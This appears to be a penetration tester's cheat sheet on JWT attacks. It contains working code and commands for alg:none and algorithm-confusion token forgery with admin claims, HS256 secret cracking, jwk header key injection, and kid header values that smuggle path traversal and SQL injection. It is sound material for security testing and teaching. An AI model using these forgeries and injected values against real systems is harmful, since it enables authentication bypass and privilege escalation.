# JWT Attacks

## Decode Without Verification
```bash
# JWT structure: header.payload.signature (base64url each part)
echo "<header_part>" | base64 -d
echo "<payload_part>" | base64 -d
```
Or use `jwt.io` locally / `pyjwt` for structured decoding.

## alg:none Attack
Some libraries accept `"alg": "none"` and skip signature verification entirely.
```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=')

token = b64url(header) + b'.' + b64url(payload) + b'.'
print(token.decode())
```
Test by sending this token with no signature (trailing dot, empty signature).

## Algorithm Confusion (RS256 → HS256)
If the server uses RS256 (asymmetric) but the verification code doesn't
enforce the algorithm, an attacker who has the public key can forge a
token signed with HS256 using the public key as the HMAC secret.
```python
import jwt

public_key = open('public.pem').read()  # obtained from server (often exposed)
forged = jwt.encode({"user": "admin", "role": "admin"}, public_key, algorithm="HS256")
print(forged)
```
Test: send the forged token and see if it's accepted.

## Weak Secret Brute Force (HS256)
```bash
# hashcat mode 16500 for JWT HS256 cracking
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# or jwt_tool
python3 jwt_tool.py <token> -C -d wordlist.txt
```

## kid (Key ID) Header Injection
```
# If 'kid' header value is used to look up key from filesystem/DB without
# sanitization, try path traversal or SQL injection via kid:
{"alg":"HS256","kid":"../../../../dev/null"}   # forces empty key -> HMAC with ""
{"alg":"HS256","kid":"' UNION SELECT 'attacker_secret'--"}
```

## jwk / x5u Header Injection
Some libraries fetch the verification key from a URL specified in the token
header itself (`jwk`, `jku`, `x5u`). If unvalidated, an attacker can host
their own key and sign the token with it.
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker_public_key_modulus>",
    "e": "AQAB",
    "kid": "attacker-key"
  }
}
```
Generate attacker keypair, embed public key in `jwk` header, sign payload
with corresponding private key.

## Expiration / Replay Testing
```
[ ] Does the server actually check "exp" claim?
[ ] Can an expired token still be used?
[ ] Is there a token revocation/blacklist mechanism, or are all issued
    tokens valid until natural expiry (logout doesn't invalidate)?
```

## Claim Tampering (Signed but Unverified Fields)
```
[ ] Does the app trust claims like "role" or "is_admin" from a valid but
    attacker-modifiable structure (e.g. no signature at all, or signature
    checked but role re-derived insecurely elsewhere)?
```

## Tooling
```bash
# jwt_tool - comprehensive JWT testing
python3 jwt_tool.py <token> -M at   # "all tests" mode, tries known attacks
```
